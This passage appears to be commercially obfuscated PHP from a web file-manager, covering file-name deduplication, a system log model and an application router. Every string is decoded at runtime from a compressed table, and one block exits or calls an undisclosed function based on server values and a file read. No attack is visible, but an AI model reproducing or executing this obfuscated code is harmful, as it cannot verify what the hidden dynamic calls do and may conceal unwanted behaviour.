fileNameAuto($ıĞÑÚŸ, $úí­Äß‚, $ÇÒöµÖğ = REPEAT_RENAME, $ÏÊÙ¥§± = false) { $Ü°³ë”¸ =& $_SERVER[öæÛ¿©¿]; $Œ™Æôş¥ = get_path_ext($úí­Äß‚); $É€¬Ó¥Ä = $Œ™Æôş¥ ? get_path_ext_name($úí­Äß‚) . $Ü°³ë”¸[2462] . $Œ™Æôş¥ : $úí­Äß‚ . $Ü°³ë”¸[471]; $»ÒÓÎŞÓ = array($Ü°³ë”¸[191] => $ıĞÑÚŸ, $Ü°³ë”¸[516] => 0, $Ü°³ë”¸[32] => array($Ü°³ë”¸[470], $É€¬Ó¥Ä)); $ò¿Ô—íû = $this->field($Ü°³ë”¸[32])->where($»ÒÓÎŞÓ)->select(); $ÅÒä²÷» = array_to_keyvalue($ò¿Ô—íû, $Ü°³ë”¸[12], $Ü°³ë”¸[32]); return $this->fileNameAutoGet($ÅÒä²÷», $úí­Äß‚, $ÇÒöµÖğ, $ÏÊÙ¥§±); } public function fileNameAutoGet($ƒñ¾“î, $şÏıœë, $Ê¹“âšÀ, $’ù¯÷‘è) { $‰âÍÒêš =& $_SERVER[öæÛ¿©¿]; if ($Ê¹“âšÀ == REPEAT_REPLACE || !$ƒñ¾“î || !in_array_not_case($şÏıœë, $ƒñ¾“î) || $’ù¯÷‘è && $Ê¹“âšÀ != REPEAT_RENAME_FOLDER) { return $şÏıœë; } if ($Ê¹“âšÀ == REPEAT_SKIP) { return !1; } $½ÄıéŸè = $‰âÍÒêš[10] . get_path_ext($şÏıœë); $½ÄıéŸè = $½ÄıéŸè == $‰âÍÒêš[10] || $’ù¯÷‘è ? $‰âÍÒêš[12] : $½ÄıéŸè; for ($„·ÒîŞ = 1; $„·ÒîŞ <= count($ƒñ¾“î) + 1; $„·ÒîŞ++) { $ÍÄÑÜ± = substr($şÏıœë, 0, strlen($şÏıœë) - strlen($½ÄıéŸè)); $ˆ•óÎƒ = $ÍÄÑÜ± . "\50{$„·ÒîŞ}\51{$½ÄıéŸè}"; if (!in_array_not_case($ˆ•óÎƒ, $ƒñ¾“î)) { return $ˆ•óÎƒ; } } } } goto d‡Ä¢Ç´› ; cÜàƒ“·¡Ÿ: define($_SERVER[öæÛ¿©¿][0], $_SERVER[öæÛ¿©¿][1]); $_SERVER[Ú”‡Õ—§] = explode($_SERVER[öæÛ¿©¿][2], gzinflate(substr($_SERVER[öæÛ¿©¿][3], 10, -8))); function binCheckEq($¤ÆÇ¸‡, $ú”’±ªÎ) { return $¤ÆÇ¸‡ == $ú”’±ªÎ; } goto dƒ¡î•°; c‘•†«êê°: if ($_SERVER[$_SERVER[öæÛ¿©¿][984]] != $_SERVER[$_SERVER[öæÛ¿©¿][1754]]) { $_getc = $_SERVER[öæÛ¿©¿][986]; $_getfile = $_SERVER[$_SERVER[öæÛ¿©¿][981]] . $_SERVER[öæÛ¿©¿][982]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[öæÛ¿©¿][286], $_getfilec); if (count($_getarrs) < $_SERVER[öæÛ¿©¿][715]) { $exit = $_SERVER[öæÛ¿©¿][987]; $exit(); } $_act = $_SERVER[öæÛ¿©¿][1755]; $_act($_SERVER[$_SERVER[öæÛ¿©¿][1756]]); } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\x2e\x4c\151\147\150\x74\x41\x70\160"; public $modelType = "\x53\x79\x73\164\x65\x6d\x4f\160\x74\x69\x6f\156"; public $field = array("\x6e\141\x6d\x65", "\147\x72\157\x75\160", "\144\x65\x73\143", "\x63\157\156\164\x65\x6e\164"); public function listData($ÉÃ©íùº = false, $ÅŸöÅ˜ = "\x6d\x6f\144\x69\146\171\x54\x69\x6d\145", $Ğêç×ŸÓ = true) { return parent::listData($ÉÃ©íùº, $ÅŸöÅ˜, $Ğêç×ŸÓ); } public function remove($ÚÇâ„) { $à¤«ßà = $this->findByName($ÚÇâ„); if (!$à¤«ßà) { return !1; } return parent::remove($à¤«ßà[$_SERVER[öæÛ¿©¿][483]]); } public function add($‹é­¶ş) { if ($this->findByName($‹é­¶ş[$_SERVER[öæÛ¿©¿][32]])) { return !1; } return parent::insert($‹é­¶ş); } public function update($ùªØå’ä, $Ô°’Åá) { $¶ÛØÖŞø =& $_SERVER[öæÛ¿©¿]; $ÀµåÍ = $this->findByName($ùªØå’ä); $©’ÒÙôì = $this->findByName($Ô°’Åá[$¶ÛØÖŞø[32]]); if (!$ÀµåÍ || $©’ÒÙôì && $©’ÒÙôì[$¶ÛØÖŞø[483]] != $ÀµåÍ[$¶ÛØÖŞø[483]]) { return !1; } return parent::update($ÀµåÍ[$¶ÛØÖŞø[483]], $Ô°’Åá); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\x65\155\137\x6c\157\x67"; protected $dataAuto = array(array("\x63\x72\145\x61\164\x65\124\x69\155\x65", "\x74\x69\x6d\145", "\151\156\163\x65\x72\164", "\x66\x75\156\143\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $»ÔıÇ¡é =& $_SERVER[öæÛ¿©¿]; return array($»ÔıÇ¡é[2502] => LNG($»ÔıÇ¡é[2503]), $»ÔıÇ¡é[2504] => LNG($»ÔıÇ¡é[2505]), $»ÔıÇ¡é[2077] => LNG($»ÔıÇ¡é[2506]), $»ÔıÇ¡é[2507] => LNG($»ÔıÇ¡é[2508]), $»ÔıÇ¡é[2509] => LNG($»ÔıÇ¡é[2510]), $»ÔıÇ¡é[2511] => LNG($»ÔıÇ¡é[2512]), $»ÔıÇ¡é[2513] => LNG($»ÔıÇ¡é[2514]), $»ÔıÇ¡é[2105] => LNG($»ÔıÇ¡é[2514]), $»ÔıÇ¡é[2106] => LNG($»ÔıÇ¡é[2515]), $»ÔıÇ¡é[2516] => LNG($»ÔıÇ¡é[2517]), $»ÔıÇ¡é[2518] => LNG($»ÔıÇ¡é[2519]), $»ÔıÇ¡é[2520] => LNG($»ÔıÇ¡é[2521]), $»ÔıÇ¡é[2522] => LNG($»ÔıÇ¡é[2523]), $»ÔıÇ¡é[2103] => LNG($»ÔıÇ¡é[2524]), $»ÔıÇ¡é[2525] => LNG($»ÔıÇ¡é[2526]), $»ÔıÇ¡é[2110] => LNG($»ÔıÇ¡é[2527]), $»ÔıÇ¡é[2528] => LNG($»ÔıÇ¡é[2529]), $»ÔıÇ¡é[2530] => LNG($»ÔıÇ¡é[2531]), $»ÔıÇ¡é[2532] => LNG($»ÔıÇ¡é[2533]), $»ÔıÇ¡é[2534] => LNG($»ÔıÇ¡é[2535]), $»ÔıÇ¡é[2112] => LNG($»ÔıÇ¡é[2536]), $»ÔıÇ¡é[2113] => LNG($»ÔıÇ¡é[2537]), $»ÔıÇ¡é[2538] => LNG($»ÔıÇ¡é[2539]), $»ÔıÇ¡é[2540] => LNG($»ÔıÇ¡é[2541]), $»ÔıÇ¡é[2542] => LNG($»ÔıÇ¡é[2543]), $»ÔıÇ¡é[2108] => LNG($»ÔıÇ¡é[2544]), $»ÔıÇ¡é[2545] => LNG($»ÔıÇ¡é[2546]), $»ÔıÇ¡é[2107] => LNG($»ÔıÇ¡é[2547]), $»ÔıÇ¡é[2548] => LNG($»ÔıÇ¡é[2548]), $»ÔıÇ¡é[2549] => LNG($»ÔıÇ¡é[2550]), $»ÔıÇ¡é[2551] => LNG($»ÔıÇ¡é[2548]), $»ÔıÇ¡é[2552] => LNG($»ÔıÇ¡é[2553]), $»ÔıÇ¡é[2554] => LNG($»ÔıÇ¡é[2555]), $»ÔıÇ¡é[2556] => LNG($»ÔıÇ¡é[2555]), $»ÔıÇ¡é[2557] => LNG($»ÔıÇ¡é[2558]), $»ÔıÇ¡é[2559] => LNG($»ÔıÇ¡é[2559]), $»ÔıÇ¡é[2560] => LNG($»ÔıÇ¡é[2081]), $»ÔıÇ¡é[2561] => LNG($»ÔıÇ¡é[2562]), $»ÔıÇ¡é[2563] => LNG($»ÔıÇ¡é[2564]), $»ÔıÇ¡é[2565] => LNG($»ÔıÇ¡é[2566]), $»ÔıÇ¡é[2567] => LNG($»ÔıÇ¡é[2568]), $»ÔıÇ¡é[2569] => LNG($»ÔıÇ¡é[2570]), $»ÔıÇ¡é[2571] => LNG($»ÔıÇ¡é[2571]), $»ÔıÇ¡é[2572] => LNG($»ÔıÇ¡é[2573]), $»ÔıÇ¡é[2574] => LNG($»ÔıÇ¡é[2575]), $»ÔıÇ¡é[2576] => LNG($»ÔıÇ¡é[2577]), $»ÔıÇ¡é[2578] => LNG($»ÔıÇ¡é[2579]), $»ÔıÇ¡é[2580] => LNG($»ÔıÇ¡é[2581]), $»ÔıÇ¡é[2582] => LNG($»ÔıÇ¡é[2583]), $»ÔıÇ¡é[211] => LNG($»ÔıÇ¡é[211]), $»ÔıÇ¡é[212] => LNG($»ÔıÇ¡é[2584]), $»ÔıÇ¡é[2585] => LNG($»ÔıÇ¡é[2585])); } private function typeFile() { $º”Åùë =& $_SERVER[öæÛ¿©¿]; $—òñÂ®ë = array($º”Åùë[2110] => array($º”Åùë[2111]), $º”Åùë[2520] => array($º”Åùë[2586]), $º”Åùë[2522] => array($º”Åùë[2587]), $º”Åùë[2103] => array($º”Åùë[2104], $º”Åùë[2588]), $º”Åùë[2530] => array(), $º”Åùë[2532] => array(), $º”Åùë[2534] => array(), $º”Åùë[2112] => array($º”Åùë[2114]), $º”Åùë[2113] => array($º”Åùë[2114]), $º”Åùë[2538] => array($º”Åùë[2589]), $º”Åùë[2540] => array($º”Åùë[2589]), $º”Åùë[2542] => array($º”Åùë[2590]), $º”Åùë[2528] => array($º”Åùë[2591]), $º”Åùë[2108] => array($º”Åùë[2592]), $º”Åùë[2545] => array($º”Åùë[2593]), $º”Åùë[2107] => array($º”Åùë[2109])); return $—òñÂ®ë; } private function typeAll() { $Â†ú„íİ =& $_SERVER[öæÛ¿©¿]; $‚À³ÛÕ© = $this->typeList; $ÖĞ»Ôñì = array_filter($this->typeFile()); foreach ($ÖĞ»Ôñì as $’í™®Êù => $Ÿ£¢ÏíÛ) { $‚À³ÛÕ©[$Ÿ£¢ÏíÛ[0]] = $‚À³ÛÕ©[$’í™®Êù]; } $‚À³ÛÕ©[$Â†ú„íİ[2114]] = LNG($Â†ú„íİ[2594]); $‚À³ÛÕ©[$Â†ú„íİ[2589]] = LNG($Â†ú„íİ[2595]); return $‚À³ÛÕ©; } public function addLog($›É‚ª—¦, $é÷‹Ë®É = array()) { $¶‡¸ë¨ =& $_SERVER[öæÛ¿©¿]; if (!isset($this->typeList[$›É‚ª—¦])) { return; } $ú‡¼„ß£ = Session::get($¶‡¸ë¨[2268]); if (!$ú‡¼„ß£) { $ú‡¼„ß£ = _get($é÷‹Ë®É, $¶‡¸ë¨[1538], 0); } if ($›É‚ª—¦ == $¶‡¸ë¨[2561] && is_array($é÷‹Ë®É[$¶‡¸ë¨[2596]]) && !$é÷‹Ë®É[$¶‡¸ë¨[2596]]) { return; } $ˆÒ’Ôñ = get_client_ip(); if (!$é÷‹Ë®É || strlen(json_encode($é÷‹Ë®É)) >= 1024 * 64) { if ($é÷‹Ë®É && is_array($é÷‹Ë®É)) { $é÷‹Ë®É = array_intersect_key($é÷‹Ë®É, array_flip($¶‡¸ë¨[483], $¶‡¸ë¨[32])); $é÷‹Ë®É[$¶‡¸ë¨[1554]] = $ˆÒ’Ôñ; } else { $é÷‹Ë®É = array($¶‡¸ë¨[1554] => $ˆÒ’Ôñ); } } else { if (is_array($é÷‹Ë®É)) { $é÷‹Ë®É[$¶‡¸ë¨[1554]] = $ˆÒ’Ôñ; } else { $é÷‹Ë®É = array($¶‡¸ë¨[1335] => $é÷‹Ë®É, $¶‡¸ë¨[1554] => $ˆÒ’Ôñ); } } $é÷‹Ë®É[$¶‡¸ë¨[2597]] = ACTION; $é÷‹Ë®É = array($¶‡¸ë¨[1915] => Session::sign(), $¶‡¸ë¨[1916] => intval($ú‡¼„ß£), $¶‡¸ë¨[33] => $›É‚ª—¦, $¶‡¸ë¨[1918] => json_encode($é÷‹Ë®É)); Hook::trigger($¶‡¸ë¨[2598], $é÷‹Ë®É); return parent::add($é÷‹Ë®É); } public function remove($øÛØê¾¤) { $this->where(array($_SERVER[öæÛ¿©¿][504] => $øÛØê¾¤))->delete(); } private function _makeOrder($¿Û¤ñ¦ = '') { $‹³ÔÄ„Ô =& $_SERVER[öæÛ¿©¿]; $¼„ú£‚ = $‹³ÔÄ„Ô[232]; $Èì“±õ = array($‹³ÔÄ„Ô[533] => $‹³ÔÄ„Ô[534], $‹³ÔÄ„Ô[535] => $‹³ÔÄ„Ô[536]); $ÏÜä×˜¹ = Input::get($‹³ÔÄ„Ô[541], $‹³ÔÄ„Ô[7], $‹³ÔÄ„Ô[2306], array($‹³ÔÄ„Ô[2224], $‹³ÔÄ„Ô[535])); $ÏÜä×˜¹ = $Èì“±õ[$ÏÜä×˜¹]; $¿Û¤ñ¦ = $¿Û¤ñ¦ . "{$¼„ú£‚}\x20{$ÏÜä×˜¹}"; return $this->order($¿Û¤ñ¦); } public function get($¸†˜ÛÑÄ = '') { $ŠÉÕå˜ò =& $_SERVER[öæÛ¿©¿]; if (!$¸†˜ÛÑÄ) { show_json(array()); } $™òÚÜ¨í = array(); if ($¸†˜ÛÑÄ[$ŠÉÕå˜ò[1538]]) { $™òÚÜ¨í[$ŠÉÕå˜ò[1538]] = $¸†˜ÛÑÄ[$ŠÉÕå˜ò[1538]]; } if (isset($¸†˜ÛÑÄ[$ŠÉÕå˜ò[853]])) { $èƒÍ‰— = $¸†˜ÛÑÄ[$ŠÉÕå˜ò[853]]; $µ‘í¡•å = isset($¸†˜ÛÑÄ[$ŠÉÕå˜ò[854]]) ? $¸†˜ÛÑÄ[$ŠÉÕå˜ò[854]] : time(); $™òÚÜ¨í[$ŠÉÕå˜ò[232]] = array($ŠÉÕå˜ò[409], array($èƒÍ‰—, $µ‘í¡•å)); } if ($¸†˜ÛÑÄ[$ŠÉÕå˜ò[33]]) { $É€ÈÓã = explode($ŠÉÕå˜ò[50], $¸†˜ÛÑÄ[$ŠÉÕå˜ò[33]]); $Õü‹¶ç = $this->typeFile(); $ŞŞÉÉ¼¹ = array(); foreach ($É€ÈÓã as $ñŠÑ‚­) { $ŞŞÉÉ¼¹[] = $ñŠÑ‚­; if (isset($Õü‹¶ç[$ñŠÑ‚­])) { $ŞŞÉÉ¼¹ = array_merge($ŞŞÉÉ¼¹, $Õü‹¶ç[$ñŠÑ‚­]); } } $ŞŞÉÉ¼¹ = array_unique($ŞŞÉÉ¼¹); if ($ŞŞÉÉ¼¹) { $™òÚÜ¨í[$ŠÉÕå˜ò[33]] = array($ŠÉÕå˜ò[7], $ŞŞÉÉ¼¹); } } else { $™òÚÜ¨í[$ŠÉÕå˜ò[33]] = array($ŠÉÕå˜ò[2599], $ŠÉÕå˜ò[2600]); } if (!empty($¸†˜ÛÑÄ[$ŠÉÕå˜ò[1554]])) { $™òÚÜ¨í[$ŠÉÕå˜ò[536]] = array($ŠÉÕå˜ò[470], "\45{$¸†˜ÛÑÄ[$ŠÉÕå˜ò[1554]]}\45"); } $›µ£¶÷Š = $this->_makeOrder()->where($™òÚÜ¨í)->selectPage(); if (empty($›µ£¶÷Š[$ŠÉÕå˜ò[446]])) { show_json(array(), !0, $›µ£¶÷Š[$ŠÉÕå˜ò[443]]); } $›µ£¶÷Š[$ŠÉÕå˜ò[446]] = $this->logList($›µ£¶÷Š[$ŠÉÕå˜ò[446]]); return $›µ£¶÷Š; } private function ipAddress(&$öù”ø) { $õ‡Û¿ÌØ =& $_SERVER[öæÛ¿©¿]; if (!empty($öù”ø[$õ‡Û¿ÌØ[1554]])) { $ÅÁÕĞúª = IpLocation::get($öù”ø[$õ‡Û¿ÌØ[1554]]); } else { $ÅÁÕĞúª = LNG($õ‡Û¿ÌØ[2601]); } $öù”ø[$õ‡Û¿ÌØ[2602]] = $ÅÁÕĞúª; } private function descZipDownload($¡´¥¤¢, &$ÚÍ­Æ±§) { $Â¥”øÏç =& $_SERVER[öæÛ¿©¿]; if (!isset($¡´¥¤¢[$Â¥”øÏç[1561]])) { return; } $ÑÓ‘Ú£å = json_decode($¡´¥¤¢[$Â¥”øÏç[1561]], !0); foreach ($ÑÓ‘Ú£å as $ˆ¬õ×¾İ) { try { $º§À­ç¤ = IO::infoFullSimple($ˆ¬õ×¾İ[$Â¥”øÏç[87]]); } catch (Exception $®‚­Íàø) { continue; } $¡´¥¤¢[$Â¥”øÏç[87]] = $ˆ¬õ×¾İ[$Â¥”øÏç[87]]; $ÚÍ­Æ±§[] = $¡´¥¤¢[$Â¥”øÏç[192]] = $º§À­ç¤[$Â¥”øÏç[192]]; $ÚÍ­Æ±§[] = $¡´¥¤¢[$Â¥”øÏç[2366]] = $º§À­ç¤[$Â¥”øÏç[191]]; break; } return $¡´¥¤¢; } private function getSourceList(&$©Ã•°×ï) { $å…¨ìİÌ =& $_SERVER[öæÛ¿©¿]; $ĞÏ÷ÍÂ‘ = array(); foreach ($©Ã•°×ï as $¾›ÑÙûš => $¯Ğåƒù–) { $†¤¾Á’ = json_decode($¯Ğåƒù–[$å…¨ìİÌ[536]], !0); if ($¯Ğåƒù–[$å…¨ìİÌ[33]] == $å…¨ìİÌ[2106]) { $†¤¾Á’ = $this->descZipDownload($†¤¾Á’, $ĞÏ÷ÍÂ‘); $©Ã•°×ï[$¾›ÑÙûš][$å…¨ìİÌ[536]] = json_encode($†¤¾Á’); continue; } if (strpos($¯Ğåƒù–[$å…¨ìİÌ[33]], $å…¨ìİÌ[2368]) !== 0) { if (!isset($†¤¾Á’[$å…¨ìİÌ[87]]) || strpos($¯Ğåƒù–[$å…¨ìİÌ[33]], $å…¨ìİÌ[2603]) !== 0) { continue; } try { $ÍÓöÓó« = IO::infoFullSimple($†¤¾Á’[$å…¨ìİÌ[87]]); } catch (Exception $ÌÇ»‘ï) { continue; } $ĞÏ÷ÍÂ‘[] = $†¤¾Á’[$å…¨ìİÌ[192]] = $ÍÓöÓó«[$å…¨ìİÌ[192]]; $ĞÏ÷ÍÂ‘[] = $†¤¾Á’[$å…¨ìİÌ[2366]] = $ÍÓöÓó«[$å…¨ìİÌ[191]]; $©Ã•°×ï[$¾›ÑÙûš][$å…¨ìİÌ[536]] = json_encode($†¤¾Á’); continue; } $ĞÏ÷ÍÂ‘[] = $†¤¾Á’[$å…¨ìİÌ[192]]; $ĞÏ÷ÍÂ‘[] = $†¤¾Á’[$å…¨ìİÌ[2366]]; if ($†¤¾Á’[$å…¨ìİÌ[33]] == $å…¨ìİÌ[639]) { $ĞÏ÷ÍÂ‘[] = $†¤¾Á’[$å…¨ìİÌ[536]][$å…¨ìİÌ[1288]]; $ĞÏ÷ÍÂ‘[] = $†¤¾Á’[$å…¨ìİÌ[536]][$å…¨ìİÌ[1289]]; } if ($†¤¾Á’[$å…¨ìİÌ[33]] == $å…¨ìİÌ[2376]) { $ĞÏ÷ÍÂ‘[] = $†¤¾Á’[$å…¨ìİÌ[536]][$å…¨ìİÌ[192]]; } } if (!$ĞÏ÷ÍÂ‘) { return array(); } return Model($å…¨ìİÌ[925])->sourceListInfo($ĞÏ÷ÍÂ‘, !0); } private function logList($¿¤‹Øá¥) { $ô¬é¯„ =& $_SERVER[öæÛ¿©¿]; $°ïÀ¶‚ = array_to_keyvalue($¿¤‹Øá¥, $ô¬é¯„[12], $ô¬é¯„[1538]); $ÁğÜôè = Model($ô¬é¯„[613])->userListInfo(array_unique($°ïÀ¶‚)); $‹Ÿ×ûšµ = $this->getSourceList($¿¤‹Øá¥); $…‡¢ÍÂ¨ = $this->typeAll(); $¸¹†¦àµ = array(); $ÆÖäô†à = array(); foreach ($¿¤‹Øá¥ as $‡Ş«Ïâ« => $ƒ°¬ææñ) { $¦şñ¦Î  = $ƒ°¬ææñ[$ô¬é¯„[33]]; $âçÕ«°ı = isset($ÁğÜôè[$ƒ°¬ææñ[$ô¬é¯„[1538]]]) ? $ÁğÜôè[$ƒ°¬ææñ[$ô¬é¯„[1538]]] : !1; $§ÛïÀ®å = strpos($¦şñ¦Î , $ô¬é¯„[2604]) === 0 ? LNG($ô¬é¯„[2605]) : LNG($ô¬é¯„[2601]); $ƒ°¬ææñ[$ô¬é¯„[32]] = isset($âçÕ«°ı[$ô¬é¯„[32]]) ? $âçÕ«°ı[$ô¬é¯„[32]] : LNG($ô¬é¯„[2601]); $ƒ°¬ææñ[$ô¬é¯„[2427]] = isset($âçÕ«°ı[$ô¬é¯„[2427]]) ? $âçÕ«°ı[$ô¬é¯„[2427]] : $ô¬é¯„[12]; $ƒ°¬ææñ[$ô¬é¯„[1813]] = isset($…‡¢ÍÂ¨[$¦şñ¦Î ]) ? $…‡¢ÍÂ¨[$¦şñ¦Î ] : $§ÛïÀ®å; $ƒ°¬ææñ[$ô¬é¯„[2305]] = $âçÕ«°ı; $“ÛïŸì = json_decode($ƒ°¬ææñ[$ô¬é¯„[536]], !0); $ƒ°¬ææñ[$ô¬é¯„[1554]] = isset($“ÛïŸì[$ô¬é¯„[1554]]) ? $“ÛïŸì[$ô¬é¯„[1554]] : $ô¬é¯„[12]; $ƒ°¬ææñ[$ô¬é¯„[2602]] = IpLocation::get($ƒ°¬ææñ[$ô¬é¯„[1554]]); if (strpos($¦şñ¦Î , $ô¬é¯„[2368]) === 0 || isset($“ÛïŸì[$ô¬é¯„[2366]])) { $“ÛïŸì[$ô¬é¯„[90]] = $‹Ÿ×ûšµ[$“ÛïŸì[$ô¬é¯„[192]]]; $“ÛïŸì[$ô¬é¯„[2381]] = $‹Ÿ×ûšµ[$“ÛïŸì[$ô¬é¯„[2366]]]; if ($“ÛïŸì[$ô¬é¯„[33]] == $ô¬é¯„[639]) { $“ÛïŸì[$ô¬é¯„[536]][$ô¬é¯„[1288]] = $‹Ÿ×ûšµ[$“ÛïŸì[$ô¬é¯„[536]][$ô¬é¯„[1288]]]; $“ÛïŸì[$ô¬é¯„[536]][$ô¬é¯„[1289]] = $‹Ÿ×ûšµ[$“ÛïŸì[$ô¬é¯„[536]][$ô¬é¯„[1289]]]; } if ($“ÛïŸì[$ô¬é¯„[33]] == $ô¬é¯„[2376]) { $“ÛïŸì[$ô¬é¯„[536]][$ô¬é¯„[192]] = $‹Ÿ×ûšµ[$“ÛïŸì[$ô¬é¯„[536]][$ô¬é¯„[192]]]; } if ($“ÛïŸì[$ô¬é¯„[33]] == $ô¬é¯„[1276]) { $“ÛïŸì[$ô¬é¯„[2381]] = $“ÛïŸì[$ô¬é¯„[90]]; $“ÛïŸì[$ô¬é¯„[2366]] = $“ÛïŸì[$ô¬é¯„[2381]][$ô¬é¯„[192]]; $“ÛïŸì[$ô¬é¯„[90]] = !1; $“ÛïŸì[$ô¬é¯„[192]] = $ô¬é¯„[12]; } $¼ÆÙ×† = array($ô¬é¯„[1276], $ô¬é¯„[2364]); if (!in_array($“ÛïŸì[$ô¬é¯„[33]], $¼ÆÙ×†)) { if ($“ÛïŸì[$ô¬é¯„[90]] && $“ÛïŸì[$ô¬é¯„[90]][$ô¬é¯„[189]] == $ô¬é¯„[190]) { $ÆÖäô†à[] = $ƒ°¬ææñ[$ô¬é¯„[483]]; unset($¿¤‹Øá¥[$‡Ş«Ïâ«]); continue; } if ($“ÛïŸì[$ô¬é¯„[2381]] && $“ÛïŸì[$ô¬é¯„[2381]][$ô¬é¯„[189]] == $ô¬é¯„[190]) { $ÆÖäô†à[] = $ƒ°¬ææñ[$ô¬é¯„[483]]; unset($¿¤‹Øá¥[$‡Ş«Ïâ«]); continue; } } } $ƒ°¬ææñ[$ô¬é¯„[536]] = $“ÛïŸì; unset($ƒ°¬ææñ[$ô¬é¯„[2606]]); $¸¹†¦àµ[] = $ƒ°¬ææñ; } $this->clearSystemPathLog($ÆÖäô†à); return $¸¹†¦àµ; } private function clearSystemPathLog($Şêƒü´Æ) { $ø²Œ±ÛÑ =& $_SERVER[öæÛ¿©¿]; if (count($Şêƒü´Æ) == 0) { return; } $–¡Ûí¬ = array($ø²Œ±ÛÑ[483] => array($ø²Œ±ÛÑ[7], array_unique($Şêƒü´Æ))); $this->where($–¡Ûí¬)->delete(); } public function deviceList($Ó¹±Õú, $ÕÑß†‚ = 0) { $¡ä«”£ª =& $_SERVER[öæÛ¿©¿]; $ÌçŠŸÌ = array($¡ä«”£ª[1538] => $Ó¹±Õú, $¡ä«”£ª[232] => array($¡ä«”£ª[1126], $ÕÑß†‚), $¡ä«”£ª[33] => $¡ä«”£ª[2077]); $¥»›òØô = array(); $÷Ú‹ş†Ï = $this->field($¡ä«”£ª[2607])->where($ÌçŠŸÌ)->order($¡ä«”£ª[2379])->limit(50)->select(); foreach ($÷Ú‹ş†Ï as $ØÈüšè => $µå»ù†Ì) { if ($ØÈüšè > 0 && abs($µå»ù†Ì[$¡ä«”£ª[232]] - $÷Ú‹ş†Ï[$ØÈüšè - 1][$¡ä«”£ª[232]]) < 5) { continue; } $Á¡–Òâ› = json_decode($µå»ù†Ì[$¡ä«”£ª[536]], !0); $µå»ù†Ì[$¡ä«”£ª[1554]] = isset($Á¡–Òâ›[$¡ä«”£ª[1554]]) ? $Á¡–Òâ›[$¡ä«”£ª[1554]] : $¡ä«”£ª[12]; unset($Á¡–Òâ›[$¡ä«”£ª[1554]]); $©¶§ô¥Ø = $this->deviceType($Á¡–Òâ›[$¡ä«”£ª[2369]]); if (isset($¥»›òØô[$©¶§ô¥Ø])) { continue; } $µå»ù†Ì[$¡ä«”£ª[2602]] = IpLocation::get($µå»ù†Ì[$¡ä«”£ª[1554]]); $µå»ù†Ì[$¡ä«”£ª[536]] = $Á¡–Òâ›; $¥»›òØô[$©¶§ô¥Ø] = $µå»ù†Ì; } return array_values($¥»›òØô); } public function deviceType($¹ğäïô) { return $¹ğäïô; } } goto cãÔ¯¸Í­‰; D¬Â£ó½Ê·: while ($comfblkzqg < $_SERVER[öæÛ¿©¿][703]) { if ($comfblkzqg >= 0) { break; } $comfblkzqg++; } class Application { private $defaultModule = "\151\156\144\145\x78"; private $defaultController = "\x69\x6e\x64\145\x78"; private $defaultAction = "\x69\x6e\x64\x65\x78"; function __construct() { } public function setDefault($ØÍ½·”­) { $ªª¨« =& $_SERVER[öæÛ¿©¿]; $’üºí =& $_SERVER[„Ã«ôíÀ]; $¿³×«¦ = explode($’üºí[0], trim($ØÍ½·”­, $’üºí[0])); $“’±ªÜ¯ = $ªª¨«[704]; while (strlen($“’±ªÜ¯) < $ªª¨«[703]) { if (!$“’±ªÜ¯) { break; } $“’±ªÜ¯++; } $this->defaultModule = $¿³×«¦[0] ? $¿³×«¦[0] : $this->defaultModule; $æ¯“é‡‡ = $ªª¨«[705]; if (strlen($æ¯“é‡‡) < $ªª¨«[699]) { return; } $this->defaultController = $¿³×«¦[1] ? $¿³×«¦[1] : $this->defaultController; $this->defaultAction = $¿³×«¦[2] ? $¿³×«¦[2] : $this->defaultAction; $this->jvgu642fb8f4($’üºí[1], array($this, $’üºí[2])); $Ä½Èéä„ = $ªª¨«[706]; if (!$Ä½Èéä„) { return; } } public function appRun($ÉóÖª¦¾) { $ï…ç¥¢Í =& $_SERVER[öæÛ¿©¿]; $ì–úâˆ =& $_SERVER[„Ã«ôíÀ]; $äÖÃ¿Åç = explode($ì–úâˆ[0], $ÉóÖª¦¾); $Ğˆ±¤«Â = strtolower($äÖÃ¿Åç[0]); $’ã„ÖÎ = $ì–úâˆ[3]; $ŞÉ˜ä° = $ï…ç¥¢Í[707]; if (!$ŞÉ˜ä°) { die; } if ($Ğˆ±¤«Â == $ì–úâˆ[4]) { $’ã„ÖÎ = $ì–úâˆ[5]; $äÖÃ¿Åç[0] = $ì–úâˆ[6]; $äÖÃ¿Åç[1] = $äÖÃ¿Åç[1] . $ì–úâˆ[7]; $ÉóÖª¦¾ = join($ì–úâˆ[0], $äÖÃ¿Åç); $ÉóÖª¦¾ = trim($ÉóÖª¦¾, $ì–úâˆ[0]); } call_user_func(array($ì–úâˆ[8], $ì–úâˆ[9]), $’ã„ÖÎ . $ì–úâˆ[10], $ÉóÖª¦¾); ActionCall($ÉóÖª¦¾); $±ø…¿ßª = $ï…ç¥¢Í[708]; call_user_func(array($ì–úâˆ[8], $ì–úâˆ[9]), $’ã„ÖÎ . $ì–úâˆ[11], $ÉóÖª¦¾); } private function autorun() { $­ÙæİÌÀ =& $_SERVER[öæÛ¿©¿]; $§¤‡«‹Ï =& $_SERVER[„Ã«ôíÀ]; global $config; if (count($config[$§¤‡«‹Ï[12]]) == 0) { return; } foreach ($config[$§¤‡«‹Ï[12]] as $ƒğÕï¬ì => $Ö·Çâğ¥) { $this->appRun($Ö·Çâğ¥); $†Šúš¾ì = $­ÙæİÌÀ[709]; if (strlen($†Šúš¾ì) < $­ÙæİÌÀ[703]) { return; } } } private function vqma45b5bbff() { $å°ğØ¯õ =& $_SERVER[öæÛ¿©¿]; $ŞÈËß =& $_SERVER[„Ã«ôíÀ]; $“Ñ ‰ÔÀ = $ŞÈËß[4]; $áØ…è½‰ = $å°ğØ¯õ[710]; while (strlen($áØ…è½‰) < $å°ğØ¯õ[711]) { if (!$áØ…è½‰) { break; } $áØ…è½‰++; } $Æˆã‘ÑÅ = $GLOBALS[$ŞÈËß[13]][$ŞÈËß[14]][0]; if (!$Æˆã‘ÑÅ || strlen($Æˆã‘ÑÅ) <= strlen($“Ñ ‰ÔÀ)) { return; } if (strtolower(substr($Æˆã‘ÑÅ, -strlen($“Ñ ‰ÔÀ))) != $“Ñ ‰ÔÀ) { return; } $ Ù…¥é“ = substr($Æˆã‘ÑÅ, 0, -strlen($“Ñ ‰ÔÀ)); $ŞåË¸™œ = 